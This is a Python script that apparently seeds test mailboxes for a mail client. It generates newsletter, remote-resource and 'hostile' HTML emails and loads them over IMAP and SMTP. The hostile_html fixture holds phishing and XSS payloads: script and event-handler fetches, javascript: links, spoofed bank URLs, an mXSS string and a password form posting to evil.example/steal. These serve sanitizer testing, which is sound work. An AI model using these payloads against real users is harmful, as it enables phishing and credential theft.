<html><head><meta charset="utf-8"><title>{escape_html(title)}</title></head>
<body style="margin:0;background:#f4f4f4">
<table width="600" align="center" cellpadding="0" cellspacing="0" style="background:#ffffff">
<tr><td><img src="{host}img/{tag}/header.png" width="600" height="120" alt="Header"></td></tr>
<tr><td style="padding:20px;font-family:Arial,sans-serif">
<h1>{escape_html(title)}</h1>
<p>Here is what happened this week. <a href="https://news.example/articles/{tag}">Read more</a></p>
<img src="{host}img/{tag}/article.jpg" srcset="{host}img/{tag}/article@2x.jpg 2x" width="560" alt="Article">
<p style="font-size:11px;color:#888">You receive this mail because you subscribed.
<a href="https://news.example/unsubscribe?id={tag}">Unsubscribe</a></p>
</td></tr></table>
<img src="{host}t/{tag}.gif" width="1" height="1" alt="" style="display:none">
</body></html>
"""


def external_showcase_html(host: str, key: str) -> str:
    tag = key.replace("/", "-")
    return f"""<!DOCTYPE html>
<html><head>
<link rel="stylesheet" href="{host}css/{tag}/link.css">
<style>
@import url("{host}css/{tag}/import.css");
.hero {{ background-image: url('{host}bg/{tag}/css-background.png'); }}
@font-face {{ font-family: X; src: url({host}font/{tag}/x.woff2); }}
</style></head>
<body background="{host}bg/{tag}/body-attribute.png">
<p class="hero">Every way an HTML mail can load something from the network.</p>
<img src="{host}img/{tag}/plain.png" alt="plain">
<img src="{host.replace('http://', '//')}img/{tag}/protocol-relative.png" alt="protocol-relative">
<img srcset="{host}img/{tag}/srcset-1x.png 1x, {host}img/{tag}/srcset-2x.png 2x" alt="srcset">
<picture><source srcset="{host}img/{tag}/picture-source.webp" type="image/webp">
<img src="{host}img/{tag}/picture-fallback.png" alt="picture"></picture>
<table background="{host}bg/{tag}/table-attribute.png"><tr>
<td style="background:url({host}bg/{tag}/inline-style.png)">cell</td></tr></table>
<div style="background-image:url(&quot;{host}bg/{tag}/entity-quoted.png&quot;)">entity</div>
<video poster="{host}img/{tag}/video-poster.png" src="{host}media/{tag}/video.mp4"></video>
<audio src="{host}media/{tag}/audio.mp3"></audio>
<input type="image" src="{host}img/{tag}/input-image.png">
<svg width="10" height="10"><image href="{host}img/{tag}/svg-image.png" width="10" height="10"/></svg>
<object data="{host}obj/{tag}/object.swf"></object>
<embed src="{host}obj/{tag}/embed.swf">
<iframe src="{host}frame/{tag}/iframe.html"></iframe>
<img src="{host}t/{tag}/pixel.gif" width="1" height="1">
</body></html>
"""


def hostile_html(host: str, key: str) -> str:
    tag = key.replace("/", "-")
    return f"""<!DOCTYPE html>
<html><head>
<meta http-equiv="refresh" content="0; url=https://evil.example/refresh">
<base href="https://evil.example/">
<script>document.title = 'script ran'; fetch('{host}js/{tag}/script-tag');</script>
</head>
<body onload="fetch('{host}js/{tag}/body-onload')">
<h2>Vice Bank – Security notice</h2>
<p>Please <a href="https://evil.example/login">https://bank.example/login</a> to verify your account.</p>
<p><a href="javascript:alert('javascript-link')">Click here</a> |
<a href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">data link</a> |
<a href="https://xn--bnk-sna.example/">https://bänk.example/</a> |
<a href="https://bank.example@evil.example/">https://bank.example/account</a></p>
<img src="x" onerror="fetch('{host}js/{tag}/img-onerror')">
<svg onload="fetch('{host}js/{tag}/svg-onload')"><script>fetch('{host}js/{tag}/svg-script')</script></svg>
<iframe srcdoc="&lt;script&gt;parent.postMessage('iframe-srcdoc','*')&lt;/script&gt;"></iframe>
<form action="https://evil.example/steal" method="post"><input name="password" type="password">
<button type="submit">Log in</button></form>
<div style="width: expression(alert('css-expression'))">IE expression</div>
<a href="#" onclick="fetch('{host}js/{tag}/onclick')">onclick</a>
<object data="javascript:alert('object')"></object>
<math><mtext><table><mglyph><style><img src=x onerror="fetch('{host}js/{tag}/mxss')"></style></mglyph></table></mtext></math>
</body></html>
"""


# ---------------------------------------------------------------------------
# Loading


def connect(env: dict[str, str], user: str, password: str) -> Imap:
    imap = Imap(env["TESTMAIL_HOST"], int(env["TESTMAIL_IMAPS_PORT"]), tls_context(env),
                server_hostname=env["TESTMAIL_TLS_NAME"])
    imap.login(user, password)
    return imap


def mailbox_arg(name: str) -> str:
    return quote(mutf7_encode(name))


def message_count(imap: Imap, folder: str) -> int:
    _, untagged = imap.command(f"STATUS {mailbox_arg(folder)} (MESSAGES)")
    for line in untagged:
        match = re.search(rb"MESSAGES (\d+)", line)
        if match:
            return int(match.group(1))
    raise ImapError(f"no STATUS for {folder}")


def append_all(imap: Imap, msgs: list[Msg], window: int = 64) -> None:
    """Pipelined APPEND with non-synchronising literals (LITERAL+), in list order."""
    pending: dict[bytes, Msg] = {}
    it = iter(msgs)
    exhausted = False
    while pending or not exhausted:
        while not exhausted and len(pending) < window:
            msg = next(it, None)
            if msg is None:
                exhausted = True
                break
            tag = imap.next_tag()
            flags = " ".join(msg.flags)
            cmd = (f"{tag.decode()} APPEND {mailbox_arg(msg.folder)} ({flags}) \"{imap_date(msg.date)}\" "
                   f"{{{len(msg.raw)}+}}\r\n").encode()
            imap.send(cmd + msg.raw + b"\r\n")
            pending[tag] = msg
        line = imap.read_line()
        tag = line.split(b" ", 1)[0]
        if tag in pending:
            msg = pending.pop(tag)
            if not line[len(tag) + 1:].startswith(b"OK"):
                raise ImapError(f"APPEND of {msg.key} to {msg.folder} failed: {line.strip()!r}")


def ensure_folders(imap: Imap) -> None:
    _, untagged = imap.command('LIST "" "*"')
    existing = set()
    for line in untagged:
        match = re.match(rb'\* LIST \([^)]*\) (?:"[^"]*"|NIL) (.+)\r\n$', line)
        if match:
            existing.add(match.group(1).strip().strip(b'"').decode())
    for folder in CREATED_FOLDERS:
        if mutf7_encode(folder) not in existing:
            imap.command(f"CREATE {mailbox_arg(folder)}")
            imap.command(f"SUBSCRIBE {mailbox_arg(folder)}")


def send_smtp(env: dict[str, str], gen: Generator) -> None:
    ctx = tls_context(env)
    host = env["TESTMAIL_HOST"]
    creds = {env["TESTMAIL_ALICE_ADDRESS"]: env["TESTMAIL_ALICE_PASSWORD"],
             env["TESTMAIL_BOB_ADDRESS"]: env["TESTMAIL_BOB_PASSWORD"]}
    client_name = f"client.{env['TESTMAIL_DOMAIN']}"
    for kind, sender, rcpts, msg in gen.smtp_msgs:
        if kind == "smtps":
            smtp = smtplib.SMTP_SSL(host, int(env["TESTMAIL_SMTPS_PORT"]), local_hostname=client_name,
                                    context=ctx, timeout=30)
        else:
            port = env["TESTMAIL_SUBMISSION_PORT"] if kind == "submission" else env["TESTMAIL_SMTP_PORT"]
            smtp = smtplib.SMTP(host, int(port), local_hostname=client_name, timeout=30)
            if kind == "submission":  # the local-delivery port is used in plain text
                smtp.starttls(context=ctx)
        if kind != "smtp":
            smtp.login(sender, creds[sender])
        smtp.ehlo_or_helo_if_needed()
        options = ["BODY=8BITMIME"] if smtp.has_extn("8bitmime") else []
        smtp.sendmail(sender, rcpts, msg.raw, mail_options=options)
        smtp.quit()


def wait_for_delivery(env: dict[str, str], account: str, password: str, keys: set[str],
                      uidnext: int, timeout: float = 30.0) -> list[tuple[int, str]]:
    imap = connect(env, account, password)
    try:
        deadline = time.monotonic() + timeout
        while True:
            imap.command("EXAMINE INBOX")
            _, untagged = imap.command(f"UID FETCH {uidnext}:* (UID BODY.PEEK[HEADER.FIELDS (X-VICEMAIL-SEED)])")
            found = []
            for line in untagged:
                uid = re.search(rb"UID (\d+)", line)
                key = re.search(rb"X-Vicemail-Seed: (\S+)", line, re.IGNORECASE)
                if uid and key and int(uid.group(1)) >= uidnext:
                    found.append((int(uid.group(1)), key.group(1).decode()))
            if keys <= {k for _, k in found}:
                return sorted(found)
            if time.monotonic() > deadline:
                missing = keys - {k for _, k in found}
                raise SystemExit(f"SMTP delivery to {account} timed out; missing {sorted(missing)}. "
                                 "See testmail/.data/stalwart.log")
            time.sleep(0.2)
    finally:
        imap.logout()


def wait_for_index(env: dict[str, str], expected: dict[str, dict[str, int]], timeout: float) -> list[str]:
    """Wait until IMAP SEARCH finds every seeded message; Stalwart indexes asynchronously.

    Returns the folders that are still incomplete when the timeout expires.
    """
    creds = {"alice": (env["TESTMAIL_ALICE_ADDRESS"], env["TESTMAIL_ALICE_PASSWORD"]),
             "bob": (env["TESTMAIL_BOB_ADDRESS"], env["TESTMAIL_BOB_PASSWORD"])}
    pending = {(name, folder): count for name, folders in expected.items()
               for folder, count in folders.items() if count}
    sessions = {name: connect(env, *creds[name]) for name in creds}
    deadline = time.monotonic() + timeout
    try:
        while pending:
            for (name, folder), count in list(pending.items()):
                imap = sessions[name]
                imap.command(f"EXAMINE {mailbox_arg(folder)}")
                _, untagged = imap.command('UID SEARCH HEADER X-Vicemail-Seed ""')
                found = sum(len(line.split()) - 2 for line in untagged if line.startswith(b"* SEARCH"))
                if found >= count:
                    del pending[(name, folder)]
            if not pending or time.monotonic() > deadline:
                break
            time.sleep(0.5)
    finally:
        for imap in sessions.values():
            imap.logout()
    return [f"{creds[name][0]} {folder}" for name, folder in pending]


def uidnext(env: dict[str, str], account: str, password: str) -> int:
    imap = connect(env, account, password)
    try:
        _, untagged = imap.command("STATUS INBOX (UIDNEXT)")
        for line in untagged:
            match = re.search(rb"UIDNEXT (\d+)", line)
            if match:
                return int(match.group(1))
        raise ImapError("no UIDNEXT")
    finally:
        imap.logout()


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("count", nargs="?", type=int, default=DEFAULT_COUNT,
                        help=f"messages in alice's account (default {DEFAULT_COUNT})")
    parser.add_argument("--image-host", help="base URL for external images (default TESTMAIL_IMAGE_HOST)")
    parser.add_argument("--force", action="store_true", help="seed even if the accounts already have messages")
    parser.add_argument("--no-smtp", action="store_true", help="skip the SMTP deliveries (alice gets N-5)")
    parser.add_argument("--dump", type=Path, help="only write the messages as .eml files into DIR")
    parser.add_argument("--filler-folder", metavar="FOLDER",
                        help="put all filler messages into one folder (e.g. INBOX for one large mailbox)")
    parser.add_argument("--index-timeout", type=float, default=600.0,
                        help="seconds to wait until SEARCH finds all messages (0: do not wait)")
    args = parser.parse_args()
    env = load_env()

    started = time.monotonic()
    if args.filler_folder and args.filler_folder not in [f for f, _ in FILLER_FOLDERS]:
        parser.error(f"--filler-folder must be one of {', '.join(f for f, _ in FILLER_FOLDERS)}")
    gen = Generator(args.count, args.image_host or env["TESTMAIL_IMAGE_HOST"], env["TESTMAIL_DOMAIN"],
                    env["TESTMAIL_ALICE_ADDRESS"], env["TESTMAIL_BOB_ADDRESS"], args.filler_folder)
    gen.generate()
    generated = time.monotonic()

    if args.dump:
        for msg in gen.alice_msgs + gen.bob_msgs + [m for *_, m in gen.smtp_msgs]:
            path = args.dump / (msg.account or "smtp") / (msg.key.replace("/", "_") + ".eml")
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(msg.raw)
        print(f"wrote {len(gen.alice_msgs) + len(gen.bob_msgs) + len(gen.smtp_msgs)} files to {args.dump}")
        return 0

    accounts = {
        "alice": (env["TESTMAIL_ALICE_ADDRESS"], env["TESTMAIL_ALICE_PASSWORD"], gen.alice_msgs),
        "bob": (env["TESTMAIL_BOB_ADDRESS"], env["TESTMAIL_BOB_PASSWORD"], gen.bob_msgs),
    }
    total_bytes = 0
    for name, (user, password, msgs) in accounts.items():
        imap = connect(env, user, password)
        try:
            if not args.force:
                existing = message_count(imap, INBOX)
                if existing:
                    raise SystemExit(f"{user} already has {existing} messages in INBOX. "
                                     "Run 'scripts/testmail.sh reset' first, or pass --force.")
            if name == "alice":
                ensure_folders(imap)
            ordered = sorted(msgs, key=lambda m: (m.folder, m.date.timestamp()))
            append_all(imap, ordered)
            total_bytes += sum(len(m.raw) for m in msgs)
        finally:
            imap.logout()
    appended = time.monotonic()

    delivered: list[tuple[int, str]] = []
    if not args.no_smtp:
        alice_next = uidnext(env, env["TESTMAIL_ALICE_ADDRESS"], env["TESTMAIL_ALICE_PASSWORD"])
        bob_next = uidnext(env, env["TESTMAIL_BOB_ADDRESS"], env["TESTMAIL_BOB_PASSWORD"])
        send_smtp(env, gen)
        alice_keys = {m.key for _, _, rcpts, m in gen.smtp_msgs if env["TESTMAIL_ALICE_ADDRESS"] in rcpts}
        bob_keys = {m.key for _, _, rcpts, m in gen.smtp_msgs if env["TESTMAIL_BOB_ADDRESS"] in rcpts}
        delivered = wait_for_delivery(env, env["TESTMAIL_ALICE_ADDRESS"], env["TESTMAIL_ALICE_PASSWORD"],
                                      alice_keys, alice_next)
        wait_for_delivery(env, env["TESTMAIL_BOB_ADDRESS"], env["TESTMAIL_BOB_PASSWORD"], bob_keys, bob_next)
        total_bytes += sum(len(m.raw) for *_, m in gen.smtp_msgs)
    finished = time.monotonic()

    # Verify per-folder counts against what was generated.
    expected: dict[str, dict[str, int]] = {"alice": {}, "bob": {}}
    for name, (_, _, msgs) in accounts.items():
        for msg in msgs:
            expected[name][msg.folder] = expected[name].get(msg.folder, 0) + 1
    if not args.no_smtp:
        for _, _, rcpts, _ in gen.smtp_msgs:
            for name in ("alice", "bob"):
                if env[f"TESTMAIL_{name.upper()}_ADDRESS"] in rcpts:
                    expected[name][INBOX] = expected[name].get(INBOX, 0) + 1
    for folder in CREATED_FOLDERS:
        expected["alice"].setdefault(folder, 0)
    problems = []
    report = []
    for name, (user, password, _) in accounts.items():
        imap = connect(env, user, password)
        try:
            for folder in sorted(expected[name]):
                actual = message_count(imap, folder)
                if not args.force and actual != expected[name][folder]:
                    problems.append(f"{user} {folder}: expected {expected[name][folder]}, found {actual}")
                report.append(f"  {user:<22} {folder:<22} {actual:>6}")
        finally:
            imap.logout()

    index_ready = time.monotonic()
    unindexed: list[str] = []
    if args.index_timeout > 0 and not args.force:
        unindexed = wait_for_index(env, expected, args.index_timeout)
    index_ready = time.monotonic() - index_ready

    alice_total = sum(expected["alice"].values())
    print(f"seeded {alice_total} messages for {env['TESTMAIL_ALICE_ADDRESS']} and "
          f"{sum(expected['bob'].values())} for {env['TESTMAIL_BOB_ADDRESS']} "
          f"({total_bytes / 1e6:.1f} MB)")
    print("\n".join(report))
    if delivered:
        print("delivered via SMTP to alice: " + ", ".join(f"{k} (UID {u})" for u, k in delivered))
    print(f"time: generate {generated - started:.1f} s, append {appended - generated:.1f} s, "
          f"smtp {finished - appended:.1f} s, search index {index_ready:.1f} s, "
          f"total {time.monotonic() - started:.1f} s")
    if unindexed:
        print("warning: the search index is not complete yet for: " + ", ".join(unindexed), file=sys.stderr)
    if problems:
        print("count mismatch:\n  " + "\n  ".join(problems), file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except (ImapError, smtplib.SMTPException, ssl.SSLError, ConnectionError) as err:
        print(f"seed failed: {err}", file=sys.stderr)
        sys.exit(1)
